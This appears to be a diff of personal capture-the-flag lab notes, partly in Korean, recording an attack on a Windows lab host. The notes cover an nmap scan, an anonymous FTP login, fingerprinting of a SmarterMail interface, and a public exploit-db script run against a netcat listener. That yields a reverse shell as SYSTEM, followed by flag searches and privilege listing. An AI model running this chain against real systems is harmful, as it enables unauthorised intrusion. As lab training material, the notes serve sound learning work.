@@ -1,12 +1,12 @@
-# 192.168.132.65
+# 192.168.213.65
 
-> nmap -p- -Pn -sC -sV --open -O -oN scan.txt 192.168.132.65
+> nmap -p- -Pn -sC -sV --open -O -oN scan.txt 192.168.213.65
 
 ![](image.png)
 ┌──(root㉿docker-desktop)-[/]
-└─# nmap -p- -Pn -sC -sV --open -O -oN scan.txt 192.168.132.65
+└─# nmap -p- -Pn -sC -sV --open -O -oN scan.txt 192.168.213.65
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-06 13:52 +0000
-Nmap scan report for 192.168.132.65
+Nmap scan report for 192.168.213.65
 Host is up (0.12s latency).
 Not shown: 47682 filtered tcp ports (no-response), 17843 closed tcp ports (reset)
 Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
@@ -66,16 +66,16 @@ Nmap done: 1 IP address (1 host up) scanned in 265.58 seconds
 > anonymous FTP test
 
 ┌──(root㉿docker-desktop)-[/]
-└─# nc -v 192.168.132.65 21
-192.168.132.65: inverse host lookup failed: Unknown host
-(UNKNOWN) [192.168.132.65] 21 (ftp) open
+└─# nc -v 192.168.213.65 21
+192.168.213.65: inverse host lookup failed: Unknown host
+(UNKNOWN) [192.168.213.65] 21 (ftp) open
 220 Microsoft FTP Service
 
 ┌──(root㉿docker-desktop)-[/]
-└─# wget -r ftp://Anonymous:pass@192.168.132.65
---2026-10-06 14:09:42-- ftp://Anonymous:_password_@192.168.132.65/
-=> ‘192.168.132.65/.listing’
-Connecting to 192.168.132.65:21... connected.
+└─# wget -r ftp://Anonymous:pass@192.168.213.65
+--2026-10-06 14:09:42-- ftp://Anonymous:_password_@192.168.213.65/
+=> ‘192.168.213.65/.listing’
+Connecting to 192.168.213.65:21... connected.
 Logging in as Anonymous ... Logged in!
 ==> SYST ... done. ==> PWD ... done.
 ==> TYPE I ... done. ==> CWD not needed.
@@ -84,10 +84,10 @@ Logging in as Anonymous ... Logged in!
 > ftp anonymous login success
 
 ┌──(root㉿docker-desktop)-[/]
-└─# ftp 192.168.132.65
-Connected to 192.168.132.65.
+└─# ftp 192.168.213.65
+Connected to 192.168.213.65.
 220 Microsoft FTP Service
-Name (192.168.132.65:root): Anonymous
+Name (192.168.213.65:root): Anonymous
 331 Anonymous access allowed, send identity (e-mail name) as password.
 Password:
 230 User logged in.
@@ -194,7 +194,7 @@ local: 2020.05.12-administrative.log remote: 2020.05.12-administrative.log
 
 ![](image_2.png)
 
-> http://192.168.132.65:9998/interface/root#/login
+> http://192.168.213.65:9998/interface/root#/login
 
 ![](image_5.png)
 
@@ -212,7 +212,7 @@ Shellcodes: No Results
 ![](image_1.png)
 
 ┌──(root㉿docker-desktop)-[/]
-└─# http http://192.168.132.65:9998/interface/root#/login
+└─# http http://192.168.213.65:9998/interface/root#/login
 HTTP/1.1 200 OK
 Cache-Control: private
 Content-Encoding: gzip
@@ -224,18 +224,18 @@ Vary: Accept-Encoding
 X-AspNetMvc-Version: 5.2
 
 ┌──(root㉿docker-desktop)-[/]
-└─# curl -s http://192.168.132.65:9998/interface/login | grep -i "version\|build\|smartermail"
+└─# curl -s http://192.168.213.65:9998/interface/login | grep -i "version\|build\|smartermail"
 
 apt install whatweb
-whatweb http://192.168.132.65:9998
+whatweb http://192.168.213.65:9998
 
 ┌──(root㉿docker-desktop)-[/]
-└─# whatweb http://192.168.132.65:9998
-http://192.168.132.65:9998 [302 Found] ASP_NET[MVC5.2], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[192.168.132.65], Microsoft-IIS[10.0], RedirectLocation[/interface/root], Title[Object moved], UncommonHeaders[x-aspnetmvc-version]
-http://192.168.132.65:9998/interface/root [200 OK] ASP_NET[MVC5.2], Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[192.168.132.65], Microsoft-IIS[10.0], Script, UncommonHeaders[x-aspnetmvc-version], X-UA-Compatible[IE=edge]
+└─# whatweb http://192.168.213.65:9998
+http://192.168.213.65:9998 [302 Found] ASP_NET[MVC5.2], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[192.168.213.65], Microsoft-IIS[10.0], RedirectLocation[/interface/root], Title[Object moved], UncommonHeaders[x-aspnetmvc-version]
+http://192.168.213.65:9998/interface/root [200 OK] ASP_NET[MVC5.2], Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[192.168.213.65], Microsoft-IIS[10.0], Script, UncommonHeaders[x-aspnetmvc-version], X-UA-Compatible[IE=edge]
 
-apt install nicto
-nikto -h http://192.168.132.65:9998
+apt install nikto
+nikto -h http://192.168.213.65:9998
 ![](image_7.png)
 
 > Since the version is hard to find, let's just proceed in the order of most likely candidates
@@ -247,14 +247,118 @@ searchsploit smartermail
 /usr/share/exploitdb/exploits/windows/remote/49216.py
 /root/49216.py
 
+ipconfig -> 192.168.45.194 (local)
+![](image_9.png)
+
+vim 49216.py
+
 hostname -I
 apt install iproute2
 ip a
 
 - 윈도우 환경에서 openvpn 이라 ipconfig 로 확인해야 함... docker에서 확인하면 안 보임
+- 그냥 호스트 vpn 끊고 도커에서 vpn 직접 연결함
 
-reversing gogo
+┌──(root㉿docker-desktop)-[~]
+└─# python3 49216.py
+Traceback (most recent call last):
+File "/root/49216.py", line 38, in <module>
+s.connect((HOST,PORT))
 
-nc -lnvp 135
+```^^^^^^^^^^^^^
+ConnectionRefusedError: [Errno 111] Connection refused
+
+
+- 통신 확인
+nc -vz -w 3 192.168.213.65 17001
+
 
 > ![](image_8.png)
+```
+
+- tun0 vpn연결 확인 -> LHOST
+  - ![](image_10.png)
+
+- 리스닝 열기
+  nc -lnvp 4444
+
+- 리버싱 실시
+  - python3 49216.py
+
+- 리버싱 연결 완료
+  - ![](image_11.png)
+
+- 쉘 버전 확인
+  - 파워쉘 확인
+    PS C:\Windows\$PSVersionTable
+
+Name Value
+
+---
+
+PSVersion 5.1.18362.752
+PSEdition Desktop
+PSCompatibleVersions {1.0, 2.0, 3.0, 4.0...}
+BuildVersion 10.0.18362.752
+CLRVersion 4.0.30319.42000
+WSManStackVersion 3.0
+PSRemotingProtocolVersion 2.3
+SerializationVersion 1.1.0.1
+
+- 플래그 확인
+  PS C:\Windows\system32> Get-ChildItem -Recurse -Filter _flag_ -ErrorAction SilentlyContinue
+  PS C:\Windows\system32>
+
+┌──(root㉿docker-desktop)-[/]
+└─# nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.194] from (UNKNOWN) [192.168.213.65] 49996
+ls -Filter _Flag_
+PS C:\Windows\system32> ls -Filter _FLAG_
+PS C:\Windows\system32>
+
+whoami
+nt authority\system
+
+Get-ChildItem -File
+Get-ChildItem -Directory
+
+PS C:\> Get-ChildItem -Recurse -File -ErrorAction SilentlyContinue | Select-String "FLAG"
+
+- 권한 확인
+  whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name Description State
+========================================= ================================================================== ========
+SeAssignPrimaryTokenPrivilege Replace a process level token Disabled
+SeLockMemoryPrivilege Lock pages in memory Enabled
+SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled
+SeTcbPrivilege Act as part of the operating system Enabled
+SeSecurityPrivilege Manage auditing and security log Disabled
+SeTakeOwnershipPrivilege Take ownership of files or other objects Disabled
+SeLoadDriverPrivilege Load and unload device drivers Disabled
+SeSystemProfilePrivilege Profile system performance Enabled
+SeSystemtimePrivilege Change the system time Disabled
+SeProfileSingleProcessPrivilege Profile single process Enabled
+SeIncreaseBasePriorityPrivilege Increase scheduling priority Enabled
+SeCreatePagefilePrivilege Create a pagefile Enabled
+SeCreatePermanentPrivilege Create permanent shared objects Enabled
+SeBackupPrivilege Back up files and directories Disabled
+SeRestorePrivilege Restore files and directories Disabled
+SeShutdownPrivilege Shut down the system Disabled
+SeDebugPrivilege Debug programs Enabled
+SeAuditPrivilege Generate security audits Enabled
+SeSystemEnvironmentPrivilege Modify firmware environment values Disabled
+SeChangeNotifyPrivilege Bypass traverse checking Enabled
+SeUndockPrivilege Remove computer from docking station Disabled
+SeManageVolumePrivilege Perform volume maintenance tasks Disabled
+SeImpersonatePrivilege Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege Create global objects Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+SeTimeZonePrivilege Change the time zone Enabled
+SeCreateSymbolicLinkPrivilege Create symbolic links Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+PS C:\Windows\system32>
